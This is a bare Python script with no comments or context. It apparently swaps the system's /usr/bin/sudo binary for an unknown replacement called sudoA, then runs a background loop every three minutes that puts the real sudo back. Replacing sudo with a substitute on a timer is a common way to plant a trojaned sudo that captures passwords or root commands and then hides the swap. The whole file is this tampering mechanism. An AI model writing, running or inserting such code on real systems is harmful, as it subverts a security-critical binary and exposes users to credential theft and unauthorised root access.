import os
import time
import sys

def main():
    if(sys.argv[1] == '1'):
        time.sleep(2)
        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
    else:
        while(True):
            if(os.path.exists("/usr/bin/sudoC")):
                os.system("mv /usr/bin/sudo /usr/bin/sudoA")
                os.system("mv /usr/bin/sudoC /usr/bin/sudo")
            time.sleep(180)
main()